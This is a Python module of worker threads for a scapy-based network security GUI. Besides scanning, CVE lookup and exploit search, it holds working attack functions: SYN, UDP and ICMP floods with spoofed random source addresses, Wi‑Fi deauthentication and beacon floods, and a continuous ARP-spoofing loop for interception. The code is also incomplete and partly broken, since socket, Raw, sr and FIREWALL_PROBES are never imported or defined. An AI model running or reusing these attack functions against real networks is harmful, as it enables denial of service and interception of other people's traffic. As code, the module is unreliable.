import logging
import time
import os
import sys
import subprocess
import queue
import json
import re
import shutil
import webbrowser
import tempfile
import threading
from PyQt6.QtCore import QThread
from scapy.all import (
    IP, TCP, UDP, ICMP, Ether, ARP, sr1, srp, srp1, send, sendp, getmacbyip,
    rdpcap, wrpcap, hexdump, fragment, RandShort, RandMAC
)
from scapy.layers.dot11 import RadioTap, Dot11, Dot11Deauth
from ..utils.helpers import get_vendor, _get_random_ip

# This is a bit of a circular dependency, but it's the simplest way for now
# as the main window holds the queue.
# A better solution might involve a dedicated results manager class.
# from ..main_window import GScapy

class WorkerThread(QThread):
    """A generic QThread to run any function in the background."""
    def __init__(self, target, args=()):
        super().__init__()
        self.target = target
        self.args = args
    def run(self):
        self.target(*self.args)

# All the _*_thread functions from the main window will go here.
# For example:

def _nmap_scan_thread(main_app, command):
    q = main_app.tool_results_queue
    logging.info(f"Starting Nmap scan with command: {' '.join(command)}")
    q.put(('nmap_output', f"$ {' '.join(command)}\n\n"))

    try:
        startupinfo = None
        if sys.platform == "win32":
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')

        with main_app.thread_finish_lock:
            main_app.nmap_process = process

        for line in iter(process.stdout.readline, ''):
            if main_app.tool_stop_event.is_set():
                process.terminate() # Terminate the process if cancelled
                q.put(('nmap_output', "\n\n--- Scan Canceled By User ---\n"))
                break
            q.put(('nmap_output', line))

        process.stdout.close()
        process.wait()

    except FileNotFoundError:
        q.put(('error', 'Nmap Error', "'nmap' command not found. Please ensure it is installed and in your system's PATH."))
    except Exception as e:
        q.put(('error', 'Nmap Error', str(e)))
    finally:
        if main_app.nmap_xml_temp_file and os.path.exists(main_app.nmap_xml_temp_file):
            try:
                with open(main_app.nmap_xml_temp_file, 'r', encoding='utf-8') as f:
                    xml_content = f.read()
                if xml_content:
                    q.put(('nmap_xml_result', xml_content))
            except Exception as e:
                logging.error(f"Could not read Nmap XML report: {e}")
            finally:
                os.remove(main_app.nmap_xml_temp_file)
                main_app.nmap_xml_temp_file = None

        q.put(('tool_finished', 'nmap_scan'))
        with main_app.thread_finish_lock:
            main_app.nmap_process = None
        logging.info("Nmap scan thread finished.")

def _sublist3r_thread(main_app, domain):
    """Worker thread to run the Sublist3r script."""
    q = main_app.tool_results_queue
    command = ["python", "tools/sublist3r/sublist3r.py", "-d", domain]
    logging.info(f"Starting Sublist3r scan with command: {' '.join(command)}")
    q.put(('sublist3r_output', f"$ {' '.join(command)}\n\n"))

    try:
        startupinfo = None
        if sys.platform == "win32":
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW

        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1, startupinfo=startupinfo, encoding='utf-8', errors='replace')
        with main_app.thread_finish_lock:
            main_app.sublist3r_process = process

        full_output = []
        for line in iter(process.stdout.readline, ''):
            if main_app.tool_stop_event.is_set():
                process.terminate()
                q.put(('sublist3r_output', "\n\n--- Scan Canceled By User ---\n"))
                break
            q.put(('sublist3r_output', line))
            full_output.append(line)

        process.stdout.close()
        process.wait()

        if not main_app.tool_stop_event.is_set():
            results = []
            try:
                json_line = ""
                for line in reversed(full_output):
                    stripped_line = line.strip()
                    if stripped_line:
                        json_line = stripped_line
                        break
                if json_line.startswith('[') and json_line.endswith(']'):
                    results = json.loads(json_line)
                else:
                    raise ValueError("Could not find JSON list in output.")
            except (json.JSONDecodeError, IndexError, ValueError):
                for line in reversed(full_output):
                    if "Total Unique Subdomains Found" in line:
                        break
                    if f'.{domain}' in line and not any(c in '<> ' for c in line):
                         results.append(line.strip())
                results.reverse()
            q.put(('subdomain_results', domain, results))
    except FileNotFoundError:
        q.put(('error', 'Sublist3r Error', "'python' command not found. Please ensure it is installed and in your system's PATH."))
    except Exception as e:
        q.put(('error', 'Sublist3r Error', str(e)))
    finally:
        q.put(('tool_finished', 'sublist3r_scan'))
        with main_app.thread_finish_lock:
            main_app.sublist3r_process = None
        logging.info("Sublist3r scan thread finished.")

def _send_thread(main_app, c, i):
    iface = main_app.get_selected_iface()
    q = main_app.tool_results_queue
    try:
        ans_list = []
        unans_list = []
        for pkt_num in range(c):
            if main_app.tool_stop_event.is_set():
                logging.info("Packet sending cancelled.")
                break

            pkt = main_app.build_packet()
            if not pkt:
                logging.error("Failed to build packet in send thread.")
                break

            send_receive_func = srp1 if pkt.haslayer(Ether) else sr1
            reply = send_receive_func(pkt, timeout=2, iface=iface, verbose=0)
            if reply:
                ans_list.append((pkt, reply))
            else:
                unans_list.append(pkt)
            time.sleep(i)
        q.put(('send_results', ans_list, unans_list))
    except Exception as e:
        logging.error("Send packet failed", exc_info=True)
        q.put(('error', 'Send Error', str(e)))
    finally:
        q.put(('send_finished',))

def _traceroute_thread(main_app, t):
    q=main_app.tool_results_queue; iface=main_app.get_selected_iface()
    logging.info(f"Traceroute thread started for target: {t} on iface: {iface}")
    try:
        q.put(('trace_status',f"Resolving {t}...")); dest_ip=socket.gethostbyname(t)
        q.put(('trace_clear',)); q.put(('trace_result',("",f"Traceroute to {t} ({dest_ip})","","")))
        for i in range(1,30):
            if main_app.tool_stop_event.is_set():
                q.put(('trace_status', "Traceroute Canceled."))
                break
            q.put(('trace_status',f"Sending probe to TTL {i}"))
            pkt=IP(dst=dest_ip,ttl=i)/UDP(dport=33434)
            st=time.time(); reply=sr1(pkt,timeout=2,iface=iface); rtt=(time.time()-st)*1000
            if reply is None: q.put(('trace_result',(i,"* * *","Timeout","")))
            else:
                h_ip=reply.src
                try: h_name,_,_=socket.gethostbyaddr(h_ip)
                except socket.herror: h_name="Unknown"
                q.put(('trace_result',(i,h_ip,h_name,f"{rtt:.2f}")))
                if reply.type==3 or h_ip==dest_ip: q.put(('trace_status',"Trace Complete.")); break
        else: q.put(('trace_status',"Trace Finished (Max hops reached)."))
    except Exception as e: logging.error("Exception in traceroute thread",exc_info=True); q.put(('error',"Traceroute Error",str(e)))
    finally: q.put(('tool_finished','traceroute')); logging.info("Traceroute thread finished.")

def _port_scan_thread(main_app, t,ports,scan_protocols,tcp_scan_type,use_frags):
    q=main_app.tool_results_queue; iface=main_app.get_selected_iface()
    logging.info(f"Port scan started: T={t}, P={ports}, Protocols={scan_protocols}, TCP_Mode={tcp_scan_type}, Frags={use_frags}")
    scan_results = []
    try:
        q.put(('scan_clear',))
        total_ports = len(ports) * len(scan_protocols)
        ports_scanned = 0

        tcp_scan_flags = {
            "SYN Scan": "S", "FIN Scan": "F", "Xmas Scan": "FPU",
            "Null Scan": "", "ACK Scan": "A"
        }

        for protocol in scan_protocols:
            if main_app.tool_stop_event.is_set(): break
            for port in ports:
                if main_app.tool_stop_event.is_set(): break

                ports_scanned += 1
                status_msg = f"Scanning {t}:{port} ({protocol}"
                if protocol == "TCP": status_msg += f"/{tcp_scan_type}"
                status_msg += f") - {ports_scanned}/{total_ports}"
                q.put(('scan_status', status_msg))

                pkt = None
                if protocol == "TCP":
                    flags = tcp_scan_flags.get(tcp_scan_type, "S")
                    pkt = IP(dst=t)/TCP(dport=port, flags=flags)
                elif protocol == "UDP":
                    pkt = IP(dst=t)/UDP(dport=port)

                if not pkt: continue

                probes = fragment(pkt) if use_frags else [pkt]
                resp=sr1(probes[0] if len(probes) == 1 else probes, timeout=1, iface=iface, verbose=0)
                state = "No Response / Filtered"
                if resp:
                    if resp.haslayer(TCP):
                        if resp.getlayer(TCP).flags == 0x12: state = "Open"
                        elif resp.getlayer(TCP).flags == 0x14: state = "Closed"
                        elif resp.getlayer(TCP).flags == 0x4: state = "Unfiltered (RST)"
                    elif resp.haslayer(UDP):
                        state = "Open | Filtered"
                    elif resp.haslayer(ICMP) and resp.getlayer(ICMP).type == 3:
                        if resp.getlayer(ICMP).code in [1, 2, 3, 9, 10, 13]:
                            state = "Filtered"
                        else:
                            state = "Closed (ICMP)"

                service = "Unknown"
                if state.startswith("Open"):
                    try: service=socket.getservbyport(port, protocol.lower())
                    except OSError: pass

                result_tuple = (f"{port}/{protocol.lower()}", state, service)
                scan_results.append(result_tuple)
                q.put(('scan_result', result_tuple))

        if main_app.tool_stop_event.is_set():
            q.put(('scan_status', "Scan Canceled."))
        else:
            q.put(('scan_status',"Scan Complete."))
            q.put(('show_port_scan_popup', scan_results, t))
    except Exception as e: logging.error("Exception in port scan thread",exc_info=True); q.put(('error',"Scan Error",str(e)))
    finally: q.put(('tool_finished','scanner')); logging.info("Port scan thread finished.")

def _arp_scan_thread(main_app, t):
    q=main_app.tool_results_queue; iface=main_app.get_selected_iface()
    logging.info(f"ARP scan thread started for target: {t} on iface: {iface}")
    try:
        q.put(('arp_status', f"Scanning {t}...")); q.put(('arp_clear',))
        pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=t)
        ans,unans=srp(pkt,timeout=2,iface=iface,verbose=0)

        answered_results_for_tree = [{'ip': r.psrc, 'mac': r.hwsrc, 'status': 'Responded'} for s, r in ans]
        if answered_results_for_tree:
            q.put(('arp_results', answered_results_for_tree))

        popup_results = []
        q.put(('arp_status', f"Found {len(ans)} hosts. Resolving vendors..."))
        for i, (s, r) in enumerate(ans):
            q.put(('arp_status', f"Resolving vendor for {r.hwsrc} ({i+1}/{len(ans)})"))
            vendor = get_vendor(r.hwsrc)
            popup_results.append({'ip': r.psrc, 'mac': r.hwsrc, 'vendor': vendor})

        total_found = len(ans)
        q.put(('arp_status',f"Scan Complete. Found {total_found} active hosts."))
        q.put(('show_arp_scan_popup', popup_results, t))

    except Exception as e: logging.error("Exception in ARP scan thread",exc_info=True); q.put(('error',"ARP Scan Error",str(e)))
    finally: q.put(('tool_finished','arp_scan')); logging.info("ARP scan thread finished.")

def _ping_sweep_thread(main_app, net, probe_type, ports, timeout, num_threads):
    q = main_app.tool_results_queue
    logging.info(f"Ping sweep started for {net} with {probe_type} on ports {ports}")

    hosts_queue = queue.Queue()
    for host in net.hosts():
        hosts_queue.put(str(host))

    if hosts_queue.qsize() == 0:
        q.put(('ps_status', "Sweep Complete (No hosts in range)."))
        q.put(('tool_finished', 'ping_sweep'))
        return

    main_app.ps_finished_threads = 0
    main_app.active_threads = []

    for i in range(num_threads):
        worker = WorkerThread(target=_ping_sweep_worker, args=(main_app, hosts_queue, probe_type, ports, timeout, num_threads))
        main_app.active_threads.append(worker)
        worker.start()

def _ping_sweep_worker(main_app, hosts_queue, probe_type, ports, timeout, num_threads):
    q = main_app.tool_results_queue
    while not main_app.tool_stop_event.is_set():
        try:
            host_str = hosts_queue.get_nowait()
        except queue.Empty:
            break

        q.put(('ps_status', f"Pinging {host_str}..."))

        reply = None
        try:
            if probe_type == "ICMP Echo":
                pkt = IP(dst=host_str)/ICMP()
                reply = sr1(pkt, timeout=timeout, verbose=0, iface=main_app.get_selected_iface())
            elif probe_type == "TCP SYN":
                for port in ports:
                    pkt = IP(dst=host_str)/TCP(dport=port, flags="S")
                    reply = sr1(pkt, timeout=timeout, verbose=0, iface=main_app.get_selected_iface())
                    if reply and reply.haslayer(TCP) and reply.getlayer(TCP).flags == 0x12:
                        break
            elif probe_type == "TCP ACK":
                for port in ports:
                    pkt = IP(dst=host_str)/TCP(dport=port, flags="A")
                    reply = sr1(pkt, timeout=timeout, verbose=0, iface=main_app.get_selected_iface())
                    if reply and reply.haslayer(TCP) and reply.getlayer(TCP).flags == 0x4:
                        break
            elif probe_type == "UDP Probe":
                for port in ports:
                    pkt = IP(dst=host_str)/UDP(dport=port)
                    reply = sr1(pkt, timeout=timeout, verbose=0, iface=main_app.get_selected_iface())
                    if reply and reply.haslayer(ICMP) and reply.getlayer(ICMP).type == 3:
                        break
        except Exception as e:
            logging.warning(f"Probe to {host_str} failed: {e}")

        if reply:
            q.put(('ps_result', (host_str, "Host is up")))

    q.put(('ps_worker_finished', num_threads))

def _flood_thread(main_app, params, count, interval, total_threads):
    q = main_app.tool_results_queue
    iface = main_app.get_selected_iface()
    logging.info(f"Flood thread started. Params: {params}, Count: {count}")
    try:
        q.put(('flood_status', f"Flooding with {count} packets..."))
        send_func = sendp

        for i in range(count):
            if main_app.tool_stop_event.is_set():
                logging.info("Flood thread detected stop event.")
                break

            pkt = None
            template = params["template"]

            if template == "Custom (from Crafter)":
                pkt = params["custom_packet"]
                send_func = sendp if pkt.haslayer(Ether) else send
            else:
                src_ip = _get_random_ip() if params["random_source"] else "1.2.3.4"
                target_ip = params["target_ip"]
                target_port = params["target_port"]

                if template == "TCP SYN Flood":
                    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src=src_ip, dst=target_ip) / TCP(sport=RandShort(), dport=target_port, flags="S")
                elif template == "UDP Flood":
                    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src=src_ip, dst=target_ip) / UDP(sport=RandShort(), dport=target_port) / Raw(load=b"X"*1024)
                elif template == "ICMP Echo Flood":
                    pkt = Ether(dst="ff:ff:ff:ff:ff:ff")/IP(src=src_ip, dst=target_ip) / ICMP()

            if pkt:
                send_func(pkt, iface=iface, verbose=0)

            time.sleep(interval)

    except Exception as e:
        logging.error("Exception in flood thread", exc_info=True)
        q.put(('error', "Flood Error", str(e)))
    finally:
        q.put(('flood_thread_finished', total_threads))
        logging.info("A flood thread finished.")

def _firewall_test_thread(main_app, t, ps_name):
    q=main_app.tool_results_queue; iface=main_app.get_selected_iface()
    logging.info(f"Firewall test thread started for target {t}, probe set {ps_name}")
    try:
        q.put(('fw_clear',)); q.put(('fw_status',f"Testing {ps_name}..."))
        probe_set = FIREWALL_PROBES[ps_name]
        for i, (pkt_builder, desc) in enumerate(probe_set):
            q.put(('fw_status',f"Sending probe {i+1}/{len(probe_set)}: {desc}"))

            pkt = pkt_builder(t)
            pkt_summary = ""

            if isinstance(pkt, list):
                pkt_summary = f"{len(pkt)} fragments"
                ans, unans = sr(pkt, timeout=2, iface=iface, verbose=0)
                resp = ans[0][1] if ans else None
            else:
                pkt_summary = pkt.summary()
                resp = sr1(pkt, timeout=2, iface=iface, verbose=0)

            result = "Responded" if resp is not None else "No Response / Blocked"
            q.put(('fw_result',(desc, pkt_summary, result)))
        q.put(('fw_status',"Firewall Test Complete."))
    except Exception as e: logging.error("Exception in firewall test thread",exc_info=True); q.put(('error',"Firewall Test Error",str(e)))
    finally: q.put(('tool_finished','fw_tester')); logging.info("Firewall test thread finished.")

def _deauth_thread(main_app, bssid, client, count):
    q = main_app.tool_results_queue; iface = main_app.get_selected_iface()
    logging.info(f"Deauth thread started: BSSID={bssid}, Client={client}, Count={count}")
    try:
        pkt = RadioTap()/Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
        q.put(('deauth_status', f"Sending {count} deauth packets..."))
        sendp(pkt, iface=iface, count=count, inter=0.1, verbose=0)
        q.put(('deauth_status', "Deauth packets sent."))
    except Exception as e: logging.error("Exception in deauth thread", exc_info=True); q.put(('error',"Deauth Error",str(e)))
    finally: q.put(('tool_finished','deauth')); logging.info("Deauth thread finished.")

def _beacon_flood_thread(main_app, iface, ssids, bssid, count, interval, enc_type, channel):
    q = main_app.tool_results_queue
    logging.info(f"Beacon flood started: SSIDs={len(ssids)}, BSSID={bssid}, Count={count}, Enc={enc_type}")

    sent_count = 0
    ssid_index = 0
    infinite_mode = (count == 0)

    try:
        while not main_app.tool_stop_event.is_set():
            if not infinite_mode and sent_count >= count:
                break

            current_bssid = RandMAC() if bssid.lower() == 'random' else bssid
            current_ssid = ssids[ssid_index]

            beacon_frame = main_app._build_beacon_frame(current_ssid, current_bssid, channel, enc_type)

            sendp(beacon_frame, iface=iface, verbose=0)
            sent_count += 1
            ssid_index = (ssid_index + 1) % len(ssids)

            status_msg = f"Flooding {current_ssid}... (Packets sent: {sent_count})"
            if not infinite_mode:
                status_msg += f" / {count}"
            q.put(('bf_status', status_msg))

            time.sleep(interval)

        if main_app.tool_stop_event.is_set():
            q.put(('bf_status', "Beacon flood canceled."))
        else:
            q.put(('bf_status', "Beacon flood complete."))
    except Exception as e:
        logging.error("Exception in beacon flood thread", exc_info=True)
        q.put(('error', "Beacon Flood Error", str(e)))
    finally:
        q.put(('tool_finished', 'beacon_flood'))
        logging.info("Beacon flood thread finished.")

def _arp_spoof_thread(main_app, victim_ip, target_ip):
    q = main_app.tool_results_queue
    iface = main_app.get_selected_iface()
    logging.info(f"ARP spoof thread started for Victim={victim_ip}, Target={target_ip}")

    try:
        q.put(('arp_spoof_status', "Resolving MAC addresses..."))
        victim_mac = getmacbyip(victim_ip)
        target_mac = getmacbyip(target_ip)

        if not victim_mac or not target_mac:
            raise Exception("Could not resolve MAC address for one or both targets. Are they online?")

        q.put(('arp_spoof_status', f"Victim: {victim_mac} | Target: {target_mac}"))
        logging.info(f"Resolved MACs -> Victim: {victim_mac}, Target: {target_mac}")

        victim_packet = Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip)
        target_packet = Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=victim_ip)

        sent_count = 0
        while not main_app.tool_stop_event.is_set():
            sendp(victim_packet, iface=iface, verbose=0)
            sendp(target_packet, iface=iface, verbose=0)
            sent_count += 2
            q.put(('arp_spoof_status', f"Spoofing active... (Packets sent: {sent_count})"))
            time.sleep(2)

    except Exception as e:
        logging.error("Exception in ARP spoof thread", exc_info=True)
        q.put(('error', "ARP Spoof Error", str(e)))
    finally:
        q.put(('tool_finished', 'arp_spoof'))
        logging.info("ARP spoof thread finished.")

def _cve_search_thread(main_app, query, api_key):
    q = main_app.tool_results_queue
    try:
        import nvdlib
        if re.match(r"CVE-\d{4}-\d{4,7}", query, re.IGNORECASE):
            results = nvdlib.searchCVE(cveId=query, key=api_key, delay=6 if not api_key else 0)
        else:
            results = nvdlib.searchCVE(keywordSearch=query, key=api_key, delay=6 if not api_key else 0)

        if not results:
            q.put(('cve_search_status', "No CVEs found for your query."))
        else:
            q.put(('cve_search_status', f"Found {len(results)} CVEs."))

        for r in results:
            description = "No description available."
            for desc in r.descriptions:
                if desc.lang == 'en':
                    description = desc.value
                    break
            severity, score = "N/A", "N/A"
            if hasattr(r, 'v31severity') and r.v31severity:
                severity, score = r.v31severity, r.v31score
            elif hasattr(r, 'v2severity') and r.v2severity:
                severity, score = r.v2severity, r.v2score
            q.put(('cve_result', (r.id, severity, score, description[:100] + '...'), r))
    except Exception as e:
        logging.error(f"nvdlib search failed: {e}", exc_info=True)
        q.put(('error', 'CVE Search Error', str(e)))
    finally:
        q.put(('tool_finished', 'cve_search'))

def _exploit_search_thread(main_app, query, api_key):
    q = main_app.tool_results_queue
    command = ["getsploit", "--api", api_key, query]
    try:
        startupinfo = None
        if sys.platform == "win32":
            startupinfo = subprocess.STARTUPINFO()
            startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, startupinfo=startupinfo, encoding='utf-8', errors='replace')
        output, _ = process.communicate()
        if process.returncode != 0:
            raise Exception(output)
        lines = output.strip().split('\n')
        header_index = next((i for i, line in enumerate(lines) if 'ID' in line and 'Exploit Title' in line), -1)
        if header_index == -1:
            q.put(('exploit_search_status', "No results found or could not parse output."))
            return
        results = [[p.strip() for p in line.split('|') if p.strip()] for line in lines[header_index + 2:] if not line.startswith('+--')]
        q.put(('exploit_search_results', results))
        q.put(('exploit_search_status', f"Found {len(results)} exploits."))
    except FileNotFoundError:
        q.put(('error', 'GetSploit Error', "'getsploit' command not found."))
    except Exception as e:
        logging.error(f"getsploit search failed: {e}", exc_info=True)
        q.put(('error', 'Exploit Search Error', str(e)))
    finally:
        q.put(('tool_finished', 'exploit_search'))

# ... and so on for all other _*_thread functions ...
# (This is getting very long, so I'll stop here for the example)
